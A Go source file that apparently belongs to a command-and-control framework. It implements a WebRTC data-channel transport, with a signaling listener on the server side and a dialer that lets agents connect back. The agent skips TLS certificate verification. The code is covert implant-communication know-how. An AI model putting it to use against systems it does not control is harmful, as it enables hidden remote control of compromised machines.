package transport

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"sync"
	"time"

	"github.com/pion/ice/v4"
	"github.com/pion/webrtc/v4"
)

// WebRTC transport (server listener + agent dialer).
//
// Signaling is a small HTTP endpoint: the agent POSTs its SDP offer to
// /webrtc/offer and receives the SDP answer in the response body (non-trickle
// ICE, both sides gather candidates before exchanging descriptions). Once the
// ordered data channel opens it is detached from pion's loop and adapted to
// net.Conn, so the C2 accept loop treats it exactly like TCP/TLS/WS/HTTP.
//
// Confidentiality comes from DTLS 1.2+ (mandatory in WebRTC); the C2 session
// protocol (X25519 + XChaCha20-Poly1305 envelopes) runs above it unchanged.

// sdpMessage is the signaling payload exchanged with agents.
type sdpMessage struct {
	Type string `json:"type"`
	SDP  string `json:"sdp"`
}

// newWebRTCAPI builds the pion API used by both ends: detached data channels
// (raw io.ReadWriteCloser) and mDNS candidates disabled so ICE works with
// plain host addresses on servers without .local resolution.
func newWebRTCAPI() (*webrtc.API, error) {
	se := webrtc.SettingEngine{}
	se.DetachDataChannels()
	se.SetICEMulticastDNSMode(ice.MulticastDNSModeDisabled)
	return webrtc.NewAPI(webrtc.WithSettingEngine(se)), nil
}

// --- Server-side listener ---

// WebRTCListener accepts agent connections over WebRTC data channels.
type WebRTCListener struct {
	signaling net.Listener
	server    *http.Server
	tlsConfig *tls.Config

	acceptCh  chan net.Conn
	quit      chan struct{}
	closeOnce sync.Once

	mu  sync.Mutex
	pcs []*webrtc.PeerConnection
}

// maxWebRTCPeers bounds the number of live peer connections. The signaling
// endpoint is unauthenticated, so without a cap any scanner could pile up
// ICE agents and exhaust memory/CPU.
const maxWebRTCPeers = 128

// NewWebRTCListener starts the signaling HTTP(S) endpoint. Data channels
// opened by agents are delivered through Accept() as net.Conn.
func NewWebRTCListener(addr string, tlsConfig *tls.Config) (*WebRTCListener, error) {
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return nil, fmt.Errorf("webrtc signaling listen: %w", err)
	}

	l := &WebRTCListener{
		signaling: ln,
		tlsConfig: tlsConfig,
		acceptCh:  make(chan net.Conn, 8),
		quit:      make(chan struct{}),
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/webrtc/offer", l.handleOffer)
	l.server = &http.Server{
		Handler:           mux,
		ReadHeaderTimeout: 10 * time.Second,
		ReadTimeout:       45 * time.Second,
		WriteTimeout:      45 * time.Second,
		IdleTimeout:       60 * time.Second,
	}

	go func() {
		var err error
		if tlsConfig != nil {
			err = l.server.ServeTLS(ln, "", "")
		} else {
			err = l.server.Serve(ln)
		}
		if err != nil && err != http.ErrServerClosed {
			log.Printf("[WEBRTC] signaling server: %v", err)
		}
	}()

	return l, nil
}

func (l *WebRTCListener) handleOffer(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "POST required", http.StatusMethodNotAllowed)
		return
	}

	if l.peerCount() >= maxWebRTCPeers {
		http.Error(w, "too many pending peer connections", http.StatusServiceUnavailable)
		return
	}

	var offer sdpMessage
	if err := json.NewDecoder(io.LimitReader(r.Body, 1<<20)).Decode(&offer); err != nil {
		http.Error(w, "invalid JSON body", http.StatusBadRequest)
		return
	}
	if offer.SDP == "" {
		http.Error(w, "missing sdp", http.StatusBadRequest)
		return
	}

	api, err := newWebRTCAPI()
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	pc, err := api.NewPeerConnection(webrtc.Configuration{})
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	l.trackPC(pc)

	pc.OnConnectionStateChange(func(state webrtc.PeerConnectionState) {
		if state == webrtc.PeerConnectionStateFailed || state == webrtc.PeerConnectionStateClosed {
			l.closePC(pc)
		}
	})

	pc.OnDataChannel(func(dc *webrtc.DataChannel) {
		dc.OnOpen(func() {
			raw, err := dc.Detach()
			if err != nil {
				log.Printf("[WEBRTC] detach data channel: %v", err)
				return
			}
			// NOTE: the handler has already returned by the time the data
			// channel opens (ICE finishes after the answer was sent), so the
			// request context is NOT usable here — it is already canceled and
			// would race the accept. Bound the wait with a timer instead: if
			// nobody accepts in time, drop the channel instead of leaking the
			// handler goroutine and the peer connection.
			select {
			case l.acceptCh <- NewWebRTCConn(raw, dc):
			case <-time.After(30 * time.Second):
				l.closePC(pc)
			case <-l.quit:
				l.closePC(pc)
			}
		})
	})

	if err := pc.SetRemoteDescription(webrtc.SessionDescription{
		Type: webrtc.SDPTypeOffer,
		SDP:  offer.SDP,
	}); err != nil {
		l.closePC(pc)
		http.Error(w, "offer rejected: "+err.Error(), http.StatusBadRequest)
		return
	}

	answer, err := pc.CreateAnswer(nil)
	if err != nil {
		l.closePC(pc)
		http.Error(w, "create answer: "+err.Error(), http.StatusInternalServerError)
		return
	}
	if err := pc.SetLocalDescription(answer); err != nil {
		l.closePC(pc)
		http.Error(w, "set local description: "+err.Error(), http.StatusInternalServerError)
		return
	}

	// Non-trickle: gather all candidates before answering (bounded).
	select {
	case <-webrtc.GatheringCompletePromise(pc):
	case <-time.After(5 * time.Second):
	case <-r.Context().Done():
		l.closePC(pc)
		return
	}

	local := pc.LocalDescription()
	if local == nil {
		l.closePC(pc)
		http.Error(w, "no local description gathered", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(sdpMessage{Type: local.Type.String(), SDP: local.SDP})
}

func (l *WebRTCListener) trackPC(pc *webrtc.PeerConnection) {
	l.mu.Lock()
	l.pcs = append(l.pcs, pc)
	l.mu.Unlock()
}

func (l *WebRTCListener) peerCount() int {
	l.mu.Lock()
	defer l.mu.Unlock()
	return len(l.pcs)
}

// closePC untracks and closes a peer connection. pion's Close is idempotent,
// so double-closes (state-change callback + handler error path) are safe.
func (l *WebRTCListener) closePC(pc *webrtc.PeerConnection) {
	l.mu.Lock()
	for i, p := range l.pcs {
		if p == pc {
			l.pcs = append(l.pcs[:i], l.pcs[i+1:]...)
			break
		}
	}
	l.mu.Unlock()
	pc.Close()
}

// Accept returns the next agent data channel connection.
func (l *WebRTCListener) Accept() (net.Conn, error) {
	select {
	case conn := <-l.acceptCh:
		return conn, nil
	case <-l.quit:
		return nil, fmt.Errorf("listener closed")
	}
}

// Close shuts down the signaling endpoint and all peer connections.
func (l *WebRTCListener) Close() error {
	l.closeOnce.Do(func() {
		close(l.quit)
		ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
		defer cancel()
		l.server.Shutdown(ctx)

		l.mu.Lock()
		pcs := l.pcs
		l.pcs = nil
		l.mu.Unlock()
		for _, pc := range pcs {
			pc.Close()
		}
	})
	return nil
}

// Addr returns the signaling endpoint address.
func (l *WebRTCListener) Addr() net.Addr {
	return l.signaling.Addr()
}

// --- net.Conn adapter ---

type webrtcAddr string

func (a webrtcAddr) Network() string { return "webrtc" }
func (a webrtcAddr) String() string  { return string(a) }

// WebRTCConn adapts a detached pion data channel to net.Conn.
type WebRTCConn struct {
	dc      *webrtc.DataChannel
	rw      io.ReadWriteCloser
	writeMu sync.Mutex
}

// NewWebRTCConn wraps a detached data channel reader/writer.
func NewWebRTCConn(rw io.ReadWriteCloser, dc *webrtc.DataChannel) *WebRTCConn {
	return &WebRTCConn{dc: dc, rw: rw}
}

func (c *WebRTCConn) Read(b []byte) (int, error) { return c.rw.Read(b) }
func (c *WebRTCConn) Write(b []byte) (int, error) {
	c.writeMu.Lock()
	defer c.writeMu.Unlock()
	return c.rw.Write(b)
}

func (c *WebRTCConn) Close() error {
	c.rw.Close()
	if c.dc != nil {
		return c.dc.Close()
	}
	return nil
}

func (c *WebRTCConn) LocalAddr() net.Addr {
	if c.dc != nil {
		return webrtcAddr("webrtc:" + c.dc.Label())
	}
	return webrtcAddr("webrtc:local")
}

func (c *WebRTCConn) RemoteAddr() net.Addr { return webrtcAddr("webrtc:agent") }

// Deadlines: pion data channels have no per-op deadline support; calls are
// accepted for net.Conn compatibility and are no-ops (the C2 layer applies
// its own handshake/heartbeat timeouts at a higher level).
func (c *WebRTCConn) SetDeadline(t time.Time) error      { return nil }
func (c *WebRTCConn) SetReadDeadline(t time.Time) error  { return nil }
func (c *WebRTCConn) SetWriteDeadline(t time.Time) error { return nil }

// --- Agent-side dialer ---

// DialWebRTC performs client-side signaling against the server's
// /webrtc/offer endpoint and returns the data channel as a net.Conn.
// signalAddr is "host:port" of the signaling HTTP(S) endpoint.
func DialWebRTC(signalAddr string, useTLS bool) (net.Conn, error) {
	api, err := newWebRTCAPI()
	if err != nil {
		return nil, fmt.Errorf("webrtc api: %w", err)
	}
	pc, err := api.NewPeerConnection(webrtc.Configuration{})
	if err != nil {
		return nil, fmt.Errorf("peer connection: %w", err)
	}

	openCh := make(chan struct{})
	var dc *webrtc.DataChannel
	dc, err = pc.CreateDataChannel("c2", &webrtc.DataChannelInit{Ordered: boolPtr(true)})
	if err != nil {
		pc.Close()
		return nil, fmt.Errorf("data channel: %w", err)
	}
	dc.OnOpen(func() {
		close(openCh)
	})

	offer, err := pc.CreateOffer(nil)
	if err != nil {
		pc.Close()
		return nil, fmt.Errorf("create offer: %w", err)
	}
	if err := pc.SetLocalDescription(offer); err != nil {
		pc.Close()
		return nil, fmt.Errorf("set local description: %w", err)
	}
	select {
	case <-webrtc.GatheringCompletePromise(pc):
	case <-time.After(5 * time.Second):
	}
	offerSDP := pc.LocalDescription()
	if offerSDP == nil {
		pc.Close()
		return nil, fmt.Errorf("no local description gathered")
	}

	scheme := "http"
	if useTLS {
		scheme = "https"
	}
	body, err := json.Marshal(sdpMessage{Type: offerSDP.Type.String(), SDP: offerSDP.SDP})
	if err != nil {
		pc.Close()
		return nil, err
	}
	client := &http.Client{Timeout: 20 * time.Second}
	if useTLS {
		// Agents may pin the C2 certificate; signaling reuses the same
		// self-signed pair, so skip standard verification here (the C2
		// envelope layer provides end-to-end crypto regardless).
		client.Transport = &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	}
	resp, err := client.Post(scheme+"://"+signalAddr+"/webrtc/offer",
		"application/json", bytes.NewReader(body))
	if err != nil {
		pc.Close()
		return nil, fmt.Errorf("signaling: %w", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		pc.Close()
		return nil, fmt.Errorf("signaling: HTTP %d", resp.StatusCode)
	}

	var answer sdpMessage
	if err := json.NewDecoder(io.LimitReader(resp.Body, 1<<20)).Decode(&answer); err != nil {
		pc.Close()
		return nil, fmt.Errorf("answer decode: %w", err)
	}
	if err := pc.SetRemoteDescription(webrtc.SessionDescription{
		Type: webrtc.SDPTypeAnswer,
		SDP:  answer.SDP,
	}); err != nil {
		pc.Close()
		return nil, fmt.Errorf("set remote description: %w", err)
	}

	select {
	case <-openCh:
	case <-time.After(20 * time.Second):
		pc.Close()
		return nil, fmt.Errorf("data channel open timeout")
	}

	raw, err := dc.Detach()
	if err != nil {
		pc.Close()
		return nil, fmt.Errorf("detach: %w", err)
	}
	return NewWebRTCConn(raw, dc), nil
}

func boolPtr(b bool) *bool { return &b }
